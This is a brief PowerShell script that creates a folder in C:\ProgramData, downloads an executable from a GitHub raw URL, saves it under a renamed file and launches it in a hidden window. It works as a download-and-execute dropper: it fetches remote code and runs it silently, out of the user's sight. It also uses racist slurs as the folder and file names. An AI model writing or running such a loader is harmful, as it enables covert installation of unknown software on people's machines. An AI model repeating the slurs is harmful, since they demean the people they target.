# Set a custom folder instead of Temp
$customPath = "C:\ProgramData\Nigger"
if (-Not (Test-Path -Path $customPath)) {
    New-Item -ItemType Directory -Path $customPath
}

$exeUrl = "https://github.com/AshesByte/test/raw/refs/heads/main/USBDeview.exe"
$tempPath = [System.IO.Path]::Combine($customPath, "negro.exe")

# Download the EXE
(New-Object System.Net.WebClient).DownloadFile($exeUrl, $tempPath)

# Execute the EXE silently
Start-Process -FilePath $tempPath -WindowStyle Hidden
